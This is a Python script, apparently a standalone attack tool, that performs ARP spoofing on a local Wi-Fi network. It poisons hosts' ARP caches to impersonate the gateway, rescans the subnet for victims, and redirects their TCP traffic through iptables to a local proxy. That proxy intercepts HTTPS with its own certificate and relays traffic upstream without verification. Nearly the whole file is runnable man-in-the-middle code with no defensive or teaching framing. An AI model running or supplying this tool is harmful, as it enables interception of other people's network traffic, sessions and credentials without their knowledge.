import threading
import netifaces
import socket
import struct
import select as sel
import time
import os
import ssl
from scapy.all import *
os.system('sysctl -w net.ipv4.ip_forward=1')
os.system('iptables -t nat -F')
gate=netifaces.gateways()[2][0]
gateway=gate[0]
print('网关ip: '+gateway)
ifaddress=netifaces.ifaddresses(gate[1])
esrc=ifaddress[17][0]['addr']
print('本机mac: '+esrc)
psrc=ifaddress[2][0]['addr']
print('本机ip: '+psrc)
pnet=ifaddress[2][0]['netmask']
print('子网掩码: '+pnet)
npsrc=struct.unpack("!I",socket.inet_aton(psrc))[0]
npnet=struct.unpack("!I",socket.inet_aton(pnet))[0]
npz=npsrc&npnet
mnet=4294967295
ipnumble=mnet-npnet
print('局域网内ip数量: '+str(ipnumble))
hostlist={}
hostlock=threading.Lock()
os.system('iptables -t nat -A PREROUTING -p tcp ! -d '+psrc+' -j REDIRECT --to-port 8000')
def arptd(pack):
    threading.Thread(target=arpsniff,args=(pack,)).start()
    threading.Thread(target=hostup,args=(pack,)).start()
def arpsniff(pack):
    if(pack.op==1 and pack.pdst==gateway and pack.psrc!=gateway):
        for i in range(3):
            sendp(Ether(dst=pack.src,src=esrc)/ARP(hwlen=6,plen=4,op=2,hwsrc=esrc,psrc=gateway,hwdst=pack.src,pdst=pack.psrc),iface='wlan0',verbose=False)
            time.sleep(1)
def hostup(pack):
    if(pack.psrc!='0.0.0.0'):
        hostlock.acquire()
        try:
            hostlist[pack.psrc]=pack.src
        except Exception as e:
            print(e)
        hostlock.release()
threading.Thread(target=sniff,kwargs=({"prn":arptd,"filter":"arp and ether src !"+esrc,"iface":"wlan0"})).start()
def listst():
    while (True):
        try:
            hostlock.acquire()
            try:
                hostcp=hostlist.copy()
            except Exception as e:
                print(e)
            hostlock.release()
            for key, value in hostcp.items():
                if(key!=gateway):
                    sendp(Ether(dst=value,src=esrc)/ARP(hwlen=6,plen=4,op=2,hwsrc=esrc,psrc=gateway,hwdst=value,pdst=key),iface='wlan0',verbose=False)
        except Exception as e:
            print(e)
        time.sleep(10)
threading.Thread(target=listst).start()
def st():
    for i in range(ipnumble):
        sendp(Ether(dst='ff:ff:ff:ff:ff:ff',src=esrc)/ARP(hwlen=6,plen=4,hwsrc=esrc,psrc=psrc,hwdst='00:00:00:00:00:00',pdst=socket.inet_ntoa(struct.pack("!I",npz+i))),iface='wlan0',verbose=False)
def hostchange():
    while(True):
        try:
            time.sleep(3)
            hostlock.acquire()
            try:
                hostlist.clear()
            except Exception as e:
                print(e)
            hostlock.release()
            for i in range(10):
                st()
                time.sleep(360)
        except Exception as e:
            print(e)
threading.Thread(target=hostchange).start()
client_context=ssl._create_unverified_context(certfile='cert.crt',keyfile='id_rsa',cafile='ca.crt')
sock_context=ssl._create_unverified_context()
def http_socket(client,addr):
    try:
        sock = socket.socket()
        dst = client.getsockopt(socket.SOL_IP, 80, 16)
        (proto, port, a, b, c, d) = struct.unpack('!HHBBBB', dst[:8])
        ip = '%d.%d.%d.%d' % (a, b, c, d)
        if(port==443):
            client=client_context.wrap_socket(client,server_side=True)
        req=b''
        ish=port==80 or port==443
        '''
        if(ish):
            while(True):
                rq=client.recv(65536)
                if(not rq):
                    client.close()
                    sock.close()
                    return
                req=req+rq
                if(b'\r\n\r\n' in req):
                    break
            print(req)
        '''
        sock.connect((ip, port))
        if(port==443):
            sock=sock_context.wrap_socket(sock)
        if(req):
            sock.sendall(req)
        inputs = [client, sock]
        outputs = []
        while (True):
            r, w, e = sel.select(inputs, outputs, inputs)
            for s in r:
                if (s == client):
                    req = client.recv(65536)
                    if (not req):
                        client.close()
                        sock.close()
                        return
                    sock.sendall(req)
                else:
                    req = sock.recv(65536)
                    if (not req):
                        client.close()
                        sock.close()
                        return
                    client.sendall(req)
    except Exception as e:
        client.close()
        sock.close()
def sock():
    sock_server = socket.socket()
    sock_server.bind(("0.0.0.0", 8000))
    sock_server.listen(65536)
    while True:
        threading.Thread(target=http_socket, args=sock_server.accept()).start()
threading.Thread(target=sock).start()
